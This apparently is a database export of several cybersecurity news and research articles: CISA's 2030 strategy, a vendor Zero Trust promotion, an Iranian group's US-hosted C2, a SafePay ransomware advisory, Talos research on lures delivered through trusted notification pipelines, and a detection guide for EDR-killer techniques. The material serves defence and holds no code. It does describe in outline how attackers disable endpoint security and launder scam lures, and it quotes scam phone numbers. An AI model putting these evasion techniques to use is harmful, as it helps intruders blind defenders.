articles.title: CISA 2030 Sets Out ‘Aggressive, Anticipatory’ Cyber Defense Strategy for Critical Infrastructure
articles.context: The US Cybersecurity and Infrastructure Agency (CISA) has promised to move away from “passive defense” and towards an “aggressive, anticipatory” approach to cyber-threats...
articles.full_text:
The US Cybersecurity and Infrastructure Agency (CISA) has promised to move away from “passive defense” and towards an “aggressive, anticipatory” approach to cyber-threats affecting critical infrastructure.

This was the message of CISA’s new strategy document, CISA 2030: Defend, Harden, Prevail, published on October 26.

The agency provided details on how it will adopt a proactive stance when defending critical infrastructure, including responding to threats faster and building resilient systems.

Nick Anderson, acting director of CISA, wrote in the new CISA document: “The threat landscape we face today is not static. Nation-state actors and other malicious adversaries continue to grow more sophisticated in their efforts to compromise our networks, and there is no guarantee that a strong defense will eliminate intrusions.”

He added: “As President Trump has reminded us, resilience must be the foundation of our approach. We must ensure that when adversaries gain a foothold, we are prepared to detect them quickly, evict them decisively, and keep critical operations running without interruption.”

The strategy is designed to execute recent White House policy announcements around cybersecurity.

This includes the national cyber strategy published in March 2026, which outlined a broad framework for addressing cyber threats through government coordination, private sector partnerships and technological investment.

It emphasized using the full range of government capabilities, including offensive cyber operations, law enforcement measures and economic sanctions, to deter attacks and dismantle criminal networks.

In August 2026, President Trump announced that federal law enforcement agencies have been authorized to collaborate with private firms in conducting offensive cyber strikes on foreign threat actors targeting the US.

Read now: FBI Publishes First-Ever Cyber Strategy, With Focus on Disrupting Threat Actors

The CISA 2030 Three Pillar Strategy

The new CISA strategy sets out a roadmap to reach objectives across three pillars by 2030. These are:

Defend: Lead National Cyber Defense

CISA said it will integrate cyber defense capabilities of government, industry, State, Local, Tribal, and Territorial (SLTT) partners, and international organizations to improve the understanding of threat activity, reduce national cyber risk and strengthen cyber defenses.

One focus area will be to work with operational technology (OT) owners and operators to modernize OT environments and enhance supply chain security.

Another will be to lead the assessment and rapid deployment of emerging technology for cybersecurity.

Harden: Prioritize National Infrastructure Security

This CISA 2030 pillar will focus on integrating intelligence across critical infrastructure security operations.

This includes targeted investment in modernized tools to enable real-time decision making and alerts, as well as accelerating operational response across the critical infrastructure community.

Intelligence will also be used to ensure CISA can prioritize its efforts and resources in the areas that have the biggest impact on national infrastructure security.

Prevail: Mobilize National Resilience

The strategy also emphasized the need to ensure resilient communications and connectivity in the face of growing cyber-attacks.

CISA said it will expand priority telecommunications services utilizing next-generation capabilities to ensure emergency connectivity.

The agency will also invest in scalable, encrypted, and resilient infrastructure that enables integrated operation, protects emergency communications, and ensures continuity of essential functions in the event of disruption.

Read now: US Sanctions Chinese Hackers for Treasury, Telecom Breaches

CISA promised to deliver an approach for implementation and measurement of outcomes within 180 days, and an update on its progress against implementation within 365 days.

articles.full_text:
LevelBlue’s free Zero Trust Readiness Review helps organizations uncover security gaps and get more value from their existing investments.

One of the first questions I ask security leaders is simple: Do you know whether all your security tools work together?

The answer is rarely a straightforward yes.

Most organizations have built their security environments over many years. They purchased one tool to address an immediate threat, added another to meet a compliance requirement, and introduced others as the business adopted cloud services, supported remote work, or completed an acquisition. Each decision may have made sense at the time, but few organizations have had the opportunity to step back and evaluate the environment as a whole.

That is why we developed LevelBlue’s free Zero Trust Readiness Review. In roughly three days, one of our Solution Architects evaluates an organization’s security posture across identity, networks, devices, applications, data, and visibility. The review is aligned with the NIST SP 800-207 Zero Trust Architecture framework, and the organization receives a written report identifying potential gaps and opportunities to get more value from its existing security investments.

There is no cost, no obligation, and no predetermined platform to adopt. The organization owns the findings and decides what to do with them.

More tools do not necessarily mean better security

When I talk with security teams, I often find that the challenge is not a lack of technology. In many cases, the organization already owns many of the capabilities it needs.

The harder question is whether those capabilities are configured correctly, connected where they need to be, and supported by processes that allow the team to act on the information they produce.

For example, one tool may identify suspicious activity, while another contains the information needed to determine whether that activity is truly a threat. If the tools do not exchange information, or if the right team does not receive it quickly enough, both technologies can be working as designed while the organization still lacks the visibility needed to respond effectively.

Take the first step toward Zero Trust with the LevelBlue Readiness Review.

Learn More

We also see organizations paying for overlapping capabilities or leaving valuable features unused. That does not necessarily mean they made poor purchasing decisions. Their business, technology environment, and risk profile may simply have changed since those decisions were made.

The problem is that these inefficiencies and gaps can be difficult to recognize when every tool is evaluated individually. Security leaders need to see how the entire environment functions together.

Zero Trust is not something you can buy

Another question I frequently hear is: What product do we need to implement Zero Trust?

My answer is that Zero Trust is not a product. It is an architectural approach based on continuously evaluating access according to identity, context, risk, and the sensitivity of the resource involved.

No single platform can establish that model on its own.

An effective Zero Trust strategy depends on how identity, networks, devices, applications, data, and security visibility work together. A weakness in any one of those areas can undermine otherwise strong controls. Even sophisticated technology can fall short when policies, integrations, and operational processes do not support it.

That is why I believe a Zero Trust review should begin with the environment an organization already has, not with a predetermined list of products it is expected to purchase.

Some of the most useful questions are also the most practical:

Can you consistently verify who and what is requesting access?

Are access decisions informed by device health, user behavior, and other relevant context?

Can your security team connect related activity across the environment?

Are applications and data protected according to their sensitivity and importance to the business?

Do your existing tools share the information needed to detect and respond to threats?

Are you paying for redundant capabilities or leaving valuable features unused?

These questions help establish a realistic view of where an organization stands today. The objective is not to declare that an organization has either “achieved” or “failed” Zero Trust.

It is to identify the gaps that matter most and determine what practical improvements should come next.

The next investment may not be another tool

Security teams are being asked to reduce risk while operating under tighter budget and resource constraints. In that environment, buying another product should not always be the first response.

Sometimes the fastest way to improve security is to enable a capability the organization already owns. It may be correcting a configuration, connecting two systems that currently operate separately, or improving the process for investigating and escalating alerts. In other cases, a review may confirm that a genuine capability gap exists and that a new investment is warranted.

Both outcomes are valuable. The point is to make that decision with a clear understanding of the existing environment.

I also encourage security leaders to consider how they will communicate the findings outside the security organization. A technically accurate assessment has limited value if it cannot help the CISO explain risks, priorities, and investment needs to other executives or the board.

That is why our Zero Trust Readiness Review concludes with a written report in plain language. It provides a practical summary of where the organization stands, why the identified gaps matter, and which actions could have the greatest impact.

Start with a clear view of where you are

Zero Trust is a continuing process, not a one-time project. Technologies, business requirements, and threats will continue to change, and an organization’s security architecture must evolve with them.

But before security leaders can determine where to go next, they need an honest view of where they are today.

My advice is to begin by looking at what you already own. Understand how your tools work together, where visibility breaks down, and whether your current investments support the outcomes your organization needs. That foundation will help you focus your resources, establish defensible priorities, and make future decisions with greater confidence.

Ready to see how your security tools work together? Book your free Zero Trust Readiness Review.

The Zero Trust Readiness Review is not a compliance audit, certification, or attestation against NIST SP 800-207.

articles.title: Iranian Hacking Group Found Hosting C2 Infrastructure in the US
articles.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
articles.full_text:
An Iranian nation-state cyber threat group has been discovered using command-and-control (C2) servers based in the US to support its malware delivery and cyber-espionage campaigns.

The activity was identified by cybersecurity researchers at Semperis, who published their findings on October 22. The Iranian group is known as ‘Prince of Persia’, which has been active for around two decades.

Prince of Persia targets public and private sector organisations across the US, Europe and the Middle East, as well as dissidents and others opposed to the Iranian regime.

The multiple forms of malware used in Prince of Persia campaigns provide attackers with intrusive data exfiltration capabilities. This includes the ability to steal sensitive documents, as well as secretly taking screenshots and capturing audio recorded by the infected device.

Forms of malware identified as part of the latest Prince of Persia campaign include Foudre, a first stage malware loader and Tonnerre, a second stage malware which provides the attackers with what researchers describe as full surveillance capabilities.

The campaigns also involve a more recently identified malware known as Tornado, which builds on the codebase of previous malware. Tornado has the ability to use both HTTPS and the Telegram API as a covert C2 channel, blending in with legitimate network traffic to bypass firewalls and evade detection.

Advanced Anti-Detection Capabilities

Prince of Persia has been known to secretly hide its activity on European hosting services and virtual private servers, but anti-detection capabilities of the malware initially made it difficult for researchers to identify how the latest campaign was being hosted.

According to Tomer Bar, AVP of security research at Semperis, Prince of Persia seemed to go dark in February this year, coinciding with US and Israeli strikes against Iran.

“This isn’t unusual given that geopolitical conflict involving Iran leads to downtime with the threat group,” said Bar.

However, information in the Tornado malware resulted in researchers being able to identify where the campaign was being hosted and it was found to be a US hosting company.

While it isn’t unusual for threat groups to hide their activity within US hosting providers, it is the first time an Iranian threat group has been identified as hosting their activity on US servers in at least 12 years.

“This is the last place we expected to find Prince of Persia hiding,” Bar added.

While Prince of Persia activity is highly targeted rather than widespread, the group has been a persistent cyber threat to organizations for almost two decades. To help ensure protection from attacks by the group, Semperis has recommended the following actions:

Ensure that your security controls are up to date

Monitor for any unusual Telegram traffic.

Ensure that your operating systems are fully updated

articles.title: SafePay Has Compromised 600 Critical Infrastructure Victims Worldwide, CISA Warns
articles.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
articles.full_text:
The SafePay ransomware group has compromised at least 600 critical infrastructure organizations, according to a joint advisory issued by government agencies from the US, Germany and UK.

The authoring agencies, which includes the US Cybersecurity and Infrastructure Security Agency (CISA), warned that since emerging in August 2024, SafePay’s operations have affected a range of businesses and critical infrastructure in North America, South America, Europe and Australia.

The advisory highlighted SafePay’s extensive range of techniques for initial access and post-compromise activities. It urged security teams to take action to mitigate the specific threat posed by SafePay.

It also observed that the actor has been one of the most active ransomware groups in 2026.

A BlacKite report published in June 2026 found that the group was the third most active ransomware group in the first four months of 2026, with the actor focusing its efforts on Germany.

SafePay was also found to be the most active ransomware group in May 2026 by NCC Group, with 70 claimed attacks during the month.

It is believed that SafePay may be a rebrand of several other well-known groups – LockBit, ALPHV/BlackCat and INC Ransomware.

SafePay is believed to be behind the November 2024 ransomware attack on US business services firm Conduent, which resulted in a substantial amount of personal and healthcare data being exfiltrated. On October 16, 2026, Conduent agreed to pay $80m to settle a class action lawsuit related to the data breach.

Range of Initial Access Techniques

The advisory, published by CISA on October 20, highlighted SafePay’s extensive range of initial access vectors. These include credential exposure, implementing brute force password attacks, exploiting virtual private network (VPN) access and exploiting vulnerabilities in edge device products.

Once inside a network, SafePay attackers attempt to gain administrative privileges on existing or newly created accounts to move laterally and access sensitive systems and data. This approach involves using in-built administrative tools consistent with living off the land (LOTL) techniques, such as PsExec, WinRM and remote management and monitoring (RMM) software.

They also employ remote desktop protocol (RDP) to expand their presence within the compromised network.

SafePay actors typically disable security software to avoid detection, and have also been observed using software packing or virtual machine software protection to conceal their code.

To exfiltrate data from victim networks to attacker-controlled accounts, the threat actors use legitimate file transfer tools, such as FileZilla, OneDrive, 7-Zip, RClone and WinRAR.

Following exfiltration, SafePay actors lock victim files using sophisticated hybrid encryption scheme, which combines a ChaCha20 stream cipher with an RSA public-key cryptosystem.

Attackers Pressure Victims Using Phone Calls

The group deploys a double extortion model. It leaves a ransom note on the victim’s system, typically on the desktop or root directory, advising them that SafePay locked their system and to reach out over a chat portal via a TOR .onion link with a victim ID as the login.

SafePay typically demands a subset of company revenue in cryptocurrency in exchange for decryption software.

A representative of the group will also phone victims to increase pressure to pay the extortion demand.

If the organization refuses to pay, SafePay posts the exfiltrated data to its leak website, which is linked in the original ransom note.

How to Protect Against SafePay Attacks

The advisory set out a range of recommendations for security teams to improve their organization’s resiliency to SafePay’s known tactics, techniques and procedures (TTPs). These include:

Prioritize remediating known exploited vulnerabilities (KEVs) and keep all operating systems, software, and firmware up to date

Implement identity, credential, and access management (ICAM) policies across the organization and require MFA for all accounts

Maintain offline backups of data and regularly test and maintain backup and restoration processes

Ensure all backup data is encrypted, immutable and covers the entire organization’s data infrastructure

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented and secure location

Segment networks to prevent the spread of ransomware

Identify, detect and investigate abnormal activity and potential traversal of the indicated ransomware with a network monitoring tool

articles.title: Parasitizing trust: How legitimate infrastructure becomes a delivery pipeline for attackers
articles.context: The broader lesson is that attackers are no longer only exploiting technical vulnerabilities in infrastructure
articles.full_text:
Legitimate infrastructure has become a powerful delivery mechanism for attackers, carrying the inherent trust they once had to build. As Cisco Talos explored in our previous research on weaponizing software-as-a-service (SaaS) notification pipelines, these platforms are increasingly repurposed as proxies for malicious intent.

Talos has since tracked a significant acceleration in this trend, observing abuse across more than 25 distinct legitimate platforms in the past year.

The abused infrastructure included collaboration, productivity, file-sharing, survey, payment, and AI-related platforms.

This demonstrates that attackers are not limiting themselves to traditional phishing infrastructure or lookalike domains. Instead, they are systematically subverting the very tools businesses trust.

Order notification abuse

Talos recently analyzed two order notification campaigns abusing Staples and Dell transactional email pipelines. Together, these campaigns accounted for roughly 1,400 messages observed by Talos.

The malicious element was not the outer sender identity, like a simple forged sender or lookalike domain. It was the content of the legitimate order notification workflow rendered. The suspicious content appeared inside the notification itself, in fields that would normally contain shipping information. The attacker’s objective was to use a trusted retail pipeline to create urgency around a high-value purchase and push the recipient toward an attacker-controlled phone number.

In the first campaign, the message appeared as a Staples order confirmation from "support@orders.staples.com” with the subject line, “Here’s your Staples order #9939818875. Thanks for shopping with us.” The body displayed a plausible purchase for an Apple iPad, including order number, delivery timing, pricing, billing information and standard Staples footer content. The suspicious element was embedded in the order details: “Helpline 806 283 7712,” “Order Confirmed,” and the Staples corporate address appeared in fields normally associated with shipping or billing information.

Figure 1. Staples order notification

The structure of the message matters. The attacker was not trying to persuade the user to click a crude phishing link. Instead, the message created the impression that an expensive order had already been placed and that the fastest way to resolve it was to call the embedded “helpline.” The desired user action was a phone call. Once the victim moved from email to voice, the attacker could continue the scam through social engineering, payment manipulation, credential theft, or remote assistance fraud.

The headers reinforced the trust problem. The Staples message showed DKIM alignment for “orders.staples.com” and DMARC passed for the visible Staples domain. The message also passed through forwarding and re-encapsulation paths, including Proton Mail, Microsoft 365, and downstream enterprise mail infrastructure. These hops complicate provenance analysis, but they do not change the core issue: Authentication helped establish that the outer message was credible, while offering no assurance that the phone number or transaction context was legitimate.

The second campaign used the same pattern in a Dell order received notification. The message was sent from “Dell | Order Received <received@order.dellcom>” with the subject line, “We have your order | Dell Purchase ID: 2009829958247.” The body presented a purchase for Microsoft Project Standard 2024, totaling $736.09. As with the Staples example, the suspicious content appeared in transaction fields. The “Ship To” and “Bill To” sections included “Confirmed Order,” “Helpline 808 232 6397,” and “Call Our Sales Team”.

The Dell message used the same psychological lever: an unexpected high-value purchase, a legitimate-looking order template, and a phone number positioned as the path to resolution. The attacker did not need the recipient to trust a new domain or unfamiliar brand. The message borrowed credibility from Dell’s order pipeline and redirected the recipient toward attacker-controlled contact information.

Authentication results showed DKIM passing for Dell-related infrastructure and DMARC passing for “order.dell.com”. As with the Staples sample, forwarding artifacts and SRS-style return paths appeared as the message moved through Microsoft and enterprise mail infrastructure. But the malicious intent did not live in an obviously forged sender. It lived inside the rendered order content.

Figure 2. Dell order notification

These campaigns illustrate the same trust-boundary failure described in our earlier research on platform-as-a-proxy (PaaP) abuse. In those cases, attackers placed malicious content into SaaS fields that trusted platforms later rendered into notifications. Here, the same concept appears in commerce infrastructure, in the retailer’s order pipeline. The attacker supplies the intent, while the trusted system performs the delivery.

From a defensive perspective, sender authentication is necessary, but it is not sufficient. SPF, DKIM, and DMARC help answer whether a message came from expected infrastructure. However, they do not answer whether the transaction was legitimate, whether the rendered fields make business sense, or whether the user is being pushed toward an attacker-controlled action.

Order notifications should be treated as sensitive content. Any field reflected into a transactional message — shipping name, billing name, address line, company name, order note, support field, or fulfillment instruction — can become a delivery vehicle if it is not validated before rendering. Retailers and security teams should correlate order notification content with account history, payment state, shipping context, and known support channels. Transactional templates should reject or flag unexpected phone numbers, URLs, urgency language, and support instructions when they appear in fields where they do not belong.

In both campaigns, the wrapper was legitimate enough to inherit trust. The payload was attacker-influenced. That distinction is the center of this attack class.

The abuse of commerce pipelines is merely one manifestation of a broader, systemic vulnerability. Whether the attacker initiates a fake purchase or a fraudulent account sign-up, the root cause remains the same: Platforms are implicitly trusting data that enters their systems from untrusted sources, only to render that data into high-reputation, automated notifications. This same mechanism of reflection — where input is echoed back into an email to a third party — is the engine behind an evolution in list bombing, moving the attack from simple denial-of-service to a sophisticated vehicle for content delivery.

List bombing: From inbox disruption to content delivery

List bombing is an abuse technique in which attackers submit a victim’s email address to numerous legitimate registration, subscription or notification workflows, flooding the inbox with automated messages. While this vector is traditionally viewed as a denial-of-service or distraction tactic designed to bury critical alerts in a flood of junk, Talos has observed a subset of cases where this behavior is being repurposed as a delivery vehicle for malicious content. This abuse occurs when an attacker identifies public-facing registration, profile, or project-naming forms that lack sufficient input validation. By inputting a "hostile string" — such as a cryptocurrency-themed lure — into fields intended for a name, company, or title, the attacker forces the platform to treat this data as legitimate user information. When the service reflexively incorporates this input into its automated welcome, verification, or notification templates, the system acts as an unintended carrier, delivering the attacker’s content inside a high-reputation, system-generated email that can pass standard authentication checks.

The attacker’s objective in these cases is to bypass the security perimeter by laundering their malicious content through the brand reputation of a trusted service provider. While this is not yet a broad industry shift, it represents a calculated abuse of a platform's trust boundary. By embedding their lure in an automated notification, the adversary ensures that the message arrives with the appearance of administrative legitimacy, significantly increasing the likelihood that the recipient will trust the content. The goal is to reach the target's inbox with enough platform authority that the message may be evaluated as routine notification traffic rather than attacker-controlled content.

Figure 3. Registration field reflection

Beyond the risk to the individual recipient, this vector creates a significant brand liability. When a service provider’s infrastructure is used to broadcast fraudulent content, the resulting user complaints and bounce-backs can degrade the platform's own sender reputation, potentially triggering blocklisting that impacts their legitimate business communications.

Bounce abuse: When delivery reports carry the lure

The final vector moves the abuse pattern into the mail system itself. Instead of relying on a retailer, SaaS platform, or registration workflow to generate the message, the attacker attempts to make a delivery status workflow carry attacker-controlled content.

Bounces, formally known as delivery status notifications (DSNs) or non-delivery reports (NDRs), are generated when a message cannot be delivered. Under normal conditions, a mail system sends the delivery report back to the original SMTP envelope sender. Depending on the implementation, that report may include the original headers, portions of the message body, URLs, attachments, or an encapsulated copy of the failed message. That returned content creates the abuse opportunity.

In one example Talos observed, a mail delivery system notification carried a WeTransfer-themed file-sharing lure. The administrative wrapper made the message look like routine mail-system noise, while the nested content asked the recipient to engage with what appeared to be a file transfer workflow. The attacker’s goal was to make the phishing lure feel less like an unsolicited external message and more like part of a technical delivery failure that required review. Users are conditioned to view system errors as benign and are far more likely to engage with an "administrative" fix than a suspicious, standalone phishing email.

Figure 4. Bounce carrying a file-sharing lure

There are several ways this kind of message can reach a victim. In opportunistic backscatter, an attacker sends mail using the victim’s address as the forged envelope sender. If an intermediate system accepts the message and later fails to deliver it, the resulting DSN may be sent back to the forged sender. If the DSN includes enough of the original message, the bounce itself can carry the lure.

A second possibility is intentional bounce abuse, where the attacker uses an authenticated, compromised, or otherwise controllable sending context to trigger a delivery failure that returns attacker-influenced content. This differs from an outright forged NDR, where the attacker simply fabricates the bounce message and sends it directly. From the recipient’s mailbox, however, these cases can look similar: A delivery-failure wrapper contains content the attacker wants the user to trust.

This distinction matters for defenders. A DSN’s administrative appearance does not validate the content inside it. The outer message may be a legitimate delivery report, while the returned or encapsulated content may still contain a phishing link, credential harvesting page, malicious attachment, or social engineering prompt.

The content-trust gap: A defensive imperative

Across these vectors, the defensive failure is consistent: Trusted infrastructure is being treated as a shortcut for trusted content.

Sender authentication remains essential. SPF, DKIM, DMARC, reputation, and infrastructure analysis help determine whether a message came from an expected source. But these controls do not answer a separate and increasingly important question: What was that trusted system instructed to carry?

Order notifications, registration workflows and delivery reports all create opportunities for attacker-influenced content to appear inside messages that users and security tools are conditioned to trust. In the Staples and Dell campaigns, the suspicious content was a phone number placed into transactional fields. In list bombing and registration abuse, the lure can appear inside reflected account or profile data. In bounce abuse, the malicious content may sit inside returned message data or a nested MIME object.

Defending against this requires content-aware validation at multiple points in the delivery chain. Platform owners should treat any user-controlled value rendered into an email template as untrusted data. Fields used for names, addresses, company names, project titles, order notes or support instructions should be validated before storage and again before rendering. Phone numbers, URLs, markup, line breaks, and urgent support language should be rejected or flagged when they appear in fields where they do not belong.

Security gateways should inspect the fully rendered message, not only the sender or template. That includes HTML, text, URLs, redirects, attachments, personalization fields, and nested MIME content. For transactional email, defenders should also evaluate whether the message content aligns with the workflow that produced it. An order notification containing unexpected support numbers, cancellation instructions, or high-urgency language should be treated differently from a routine receipt.

For delivery reports, recursive MIME inspection is especially important. Gateways should parse DSN containers, extract returned messages or message fragments, and apply normal phishing, malware, and URL analysis to the nested content. A bounce should explain a delivery failure, not provide a blind path for untrusted payloads.

The broader lesson is that attackers are no longer only exploiting technical vulnerabilities in infrastructure. They are exploiting the assumptions built into business processes. When legitimate systems render attacker-influenced data into trusted notifications, the result can pass authentication checks and still deliver malicious intent.

Defenders should therefore treat sender trust and content trust as separate but complementary signals. The wrapper can explain where a message came from. It cannot prove that the payload is safe.

articles.context: "EDR killer," a tool built to shut down endpoint detection and response (EDR), is one phrase doing the work of four different attacks

Bring your own vulnerable driver (BYOVD) is having a moment in endpoint security. Some of the buzz is earned. Some of it is overblown. This series unpacks both and shows the evidence for each. This piece turns the noise into specific behavior a detection team can hunt.

"EDR killer," a tool built to shut down endpoint detection and response (EDR), is one phrase doing the work of four different attacks. Detection teams treat it as a single thing and write one rule that catches one technique and misses the other three. The fix is to split the category and hunt each one on its own telemetry.

The four techniques share a goal and little else. Bring-your-own-vulnerable-driver loads a signed but flawed driver and drives kernel termination through it. Bring-your-own-installer abuses a trusted installer or upgrade path to swap the agent out. Admin-to-kernel walks an already-elevated session into Ring 0 through a documented gap. Driverless suspension never touches the kernel and freezes or filters the agent from user space. One detection cannot see all four.

The cost of conflating them is a coverage gap you cannot see. A single driver-load rule looks like coverage for "EDR killers," but the bring-your-own-installer and driverless paths leave no driver-load event at all, so that rule is silent while the agent dies.

Four Techniques, Four Hunts

Each leaves a distinct footprint. Below is the taxonomy and the observable to hunt for each.

Technique

What the attacker does

Primary observable

Telemetry source

Bring-your-own-vulnerable-driver

Loads a signed, flawed driver and issues kernel termination through it

Driver load with untrusted or first-seen signature, then a service create

Sysmon Event ID 6, System Event 7045

Bring-your-own-installer

Abuses a trusted installer or upgrade path to replace the agent

Unexpected agent upgrade or reinstall outside change windows

Install or upgrade events against a change-window baseline

Admin-to-kernel

Walks an elevated session into the kernel through a known gap

Kernel-callback removal, loss of expected kernel telemetry

EDR kernel-callback integrity reporting

Driverless suspension

Freezes or filters the agent from user space, no driver

Process suspension or telemetry-egress blocking with no driver load

Process-state events, WFP filter changes, agent heartbeat

Each hunt gets the same treatment: the observable, the telemetry source and event ID, the rule logic in plain terms, and the false-positive consideration. A detection engineer can ship the first one this week, and the rest follow as the baselines clean up.

Hunt One: Bring-your-own-vulnerable-driver

Bring-your-own-vulnerable-driver is the loudest of the four and the first one to instrument. The live LOLDrivers project tracks thousands of vulnerable signed drivers, most reachable without admin rights, a deep supply of signed-but-flawed kernel access with mature, copyable detection logic already in the public domain.

The primary observable is a driver load that does not match a trusted, previously-seen signature. Sysmon Event ID 6 is the core signal, logging each driver load with ImageLoaded, Hashes, Signed, Signature, and SignatureStatus. Any SignatureStatus other than Valid warrants investigation.

Two signature-based detections are worth building directly. The first keys on the driver-load signature status itself: alert on any driver load whose signature status is not Valid, which catches the signature-enforcement bypass and the BYOVD loader chain. The second is a first-seen detection: alert on a driver whose hash, signer, or version has never been seen on the host before, so anomalous drivers surface on first load instead of after the kill.

The false-positive consideration is real. Patch cycles introduce new signers and hashes constantly, and a first-seen rule will flare on legitimate new software. Published detection content that joins Event ID 6 driver loads against a known-bad driver table ships with an explicit false-positive warning. Plan for a tuning period and an allowlist before this rule goes to a 24/7 queue.

The SentinelOne® Annual Threat Report reaches the same conclusion for hunting at scale, urging teams to chase suspicious behavior rather than specific hashes or file names. It names kernel-mode drivers derived from POORTRY used to kill EDR and delete security files, the posture every hunt below adopts.

POORTRY is the canonical signed-driver kill primitive defenders hunt. SentinelLABS traced the STONESTOP loader and the POORTRY kernel driver, which received a process-kill IOCTL to terminate security tools. The driver carried valid WHQL signatures, later revoked under advisory ADV220005. A signed kernel driver issuing process-termination IOCTLs is the behavior this hunt exists to catch.

Know your coverage baseline before you trust prevention to backstop this hunt. The attack surface reduction (ASR) rule blocks a vulnerable signed driver from being written to disk. It does not block a driver already present from loading, so a driver the blocklist policy would block keeps running until reboot and an in-progress kill chain survives policy activation. The CodeIntegrity Operational log Event ID 3099 confirms when the blocklist policy is applied on a host. It does not catch an attack. It tells you whether your driver-blocking policy is live.

Hunt Two: The Kill Chain As a Correlation Target

The strongest version of the loud hunt is the ordered sequence, because a single event tells you far less than the chain it belongs to. Public research documents the full bring-your-own-vulnerable-driver chain and its detection points. It runs as sc.exe service create (Sysmon Event ID 1) plus a service install (System Event 7045), then a driver load at Event ID 6, then a DeviceIoControl device-control call (IOCTL), then callback removal and security-process termination.

Correlating that ordered sequence is far stronger than alerting on any single step. A service create alone is common, and a driver load alone is common. The same two within seconds, followed by an IOCTL to the freshly-loaded driver, is a fingerprint ordinary administration does not produce. Build a windowed sequence rule keyed on the service name to the image path to the device handle.

This chain shows up in real intrusions. Public threat research documents the pattern across named campaigns including Kasseika, BlackByte, and RansomHub. Attackers register a vulnerable driver as a kernel service via sc.exe, name that service to mimic a Windows update, then abuse IOCTLs for kernel primitives. The service-name masquerade is itself a tell. A "KB" service name attached to an unsigned or first-seen driver image is a high-confidence pair, so watch the join between the 7045 service-install name and the Event ID 6 image it loads.

The false-positive profile for the correlation beats the single events by design, because the conjunction is rare even when each part is common. The cost moves from alert volume to engineering effort: you need reliable event ordering and a join key, which means Sysmon tuned to capture both the service and the driver-load fields. Ship this second, after the single Event ID 6 rule is stable.

Hunt Three: Kernel-callback Removal and The Kernel-Originated Kill Loop

Admin-to-kernel needs a different lens, because the kill itself can happen entirely below the EDR's user-mode vantage point. Independent security research argues that admin-to-kernel falls short of a real security boundary and that the driver blocklist is an incomplete defense against it. Once code reaches Ring 0, it can remove the hooks the EDR relies on before it issues a kill.

Callback removal is its own observable, distinct from a process kill, and it deserves its own hunt. SOC Prime documented Qilin loading rwdrv.sys for raw memory read and write alongside a malicious hlpdrv.sys for kernel-callback manipulation, removing EDR kernel callbacks across more than 300 products. The same rwdrv.sys plus hlpdrv.sys pairing appears in Akira and other crews. The observable to instrument is the silent disappearance of kernel callbacks, a loss of expected callback telemetry from the EDR's own integrity reporting.

The termination that follows can run as a kernel-mode loop. The user-mode component enumerates running processes on a repeating, fixed-interval loop and sends the target PIDs to a masquerading kernel-service driver via IOCTL. The driver then calls ZwTerminateProcess in kernel mode, bypassing protected-process light entirely.

The fixed-interval rekill cadence is itself a signature. A user-mode agent that respawns and dies again on a repeating, fixed interval is being killed from below, not crashing on its own. That behavioral fingerprint is what you hunt when the callbacks are already gone.

The false-positive consideration is that this hunt depends on telemetry the attacker is actively trying to remove. Treat callback-integrity loss and the rekill cadence as corroborating signals rather than standalone alerts, paired with the cross-domain witnesses below.

Hunt Four: Bring-your-own-installer and Driverless Suspension

Bring-your-own-installer is the quietest of the four, and it leaves no driver-load event at all. SentinelOne documented this tamper bypass, where an attacker abuses a trusted installer or upgrade path to swap the agent out. SentinelOne shipped Local Upgrade Authorization, default-on for new customers, plus a detection rule and a hunting query against the bypass.

The hunt is an unexpected agent upgrade or reinstall outside a sanctioned change window. Your driver-load rule will never fire, because no vulnerable driver was ever loaded. The rule logic compares each event against a baseline of approved change, so you need a clean inventory of sanctioned upgrade windows and the package signers you deploy. Any agent install, uninstall, or version change outside that window is the finding. This is the hardest false-positive profile of the four, because without that inventory, normal patching drowns the queue. Build the baseline first.

Driverless suspension is the fourth class, and it abuses user-mode tricks that never touch the kernel. EDR-Freeze suspends the EDR process by racing the WerFaultSecure crash handler, entirely in user mode. EDRSilencer uses Windows Filtering Platform (WFP) filters to block EDR telemetry across roughly 16 products. These two leave different observables, so hunt them separately.

For the suspend path, watch for process-suspension state changes against the agent process that no maintenance action requested. For the filter path, watch for new WFP filters that match the agent's known egress destinations and silently drop its outbound telemetry, the EDRSilencer pattern. Legitimate updates and some VPN software touch process state and WFP filters, so scope the rules to the agent's own process and endpoints.

Why These Hunts Must Keep Pace

This work is urgent because the tooling has industrialized. SentinelLABS traced AvNeutralizer, also called AuKill, to the cybercrime gang FIN7, sold on Russian-language forums for $4,000 to $15,000 and adopted by Black Basta, AvosLocker, MedusaLocker, BlackCat, Trigona, and LockBit. That commoditization is the theme of SentinelOne's latest Annual Threat Report, which describes the industrialization of the modern cyber breach with mature automation accelerating intrusions. Public reporting tracked EDRKillShifter, a driver-based killer the RansomHub crew added to its arsenal and offered through an affiliate program, turning a hard kernel technique into a checkbox. Defenders face a market, not a single actor, so the hunts have to generalize across tools.

The Kill Is a Detection Gift

Here is the reframe most teams miss. They read the kill attempt as a defense failure and stop there. Read it instead as a high-confidence signal that ransomware is about to fire.

The Cyber Security Agency of Singapore documents the EDR-killer-then-ransomware sequence across multiple gangs, with the killer firing shortly before the ransomware. The minutes between the kill and the encryption are minutes you can act in. A correlated chain alert or a fixed-interval rekill detection that fires in that window is a live intervention point, not a post-incident artifact. The same advisory frames the whole category this way. EDR-killer activity is detectable via driver-load monitoring, suspicious process-termination patterns, and attempts to disable telemetry, three observables that map cleanly to the four hunts above.

There is a rarer, cleaner signal worth a dedicated rule. Independent researcher Peter M. flagged Windows Event ID 7031, a service that terminated unexpectedly. Scoped to security services, it is an ideal detection candidate, and quiet enough to alert on directly. A forced kernel termination often leaves a crash trail the service control manager records anyway. The kill leaves a fingerprint even when it succeeds.

When the Kill Succeeds nyway

Assume the kill works. You still are not blind. A successful kill produces an absence-of-signal you can alert on directly: agent-health drop, heartbeat loss, and the absence of expected telemetry, all findings alongside your suspicious-event rules. The SentinelOne Annual Threat Report describes one SaaS compromise that ran for 71 days until an automated detection correlated activity a manual review of sign-in logs had missed. Absence-of-signal correlation is exactly the kind of work a human queue rarely sustains alone.

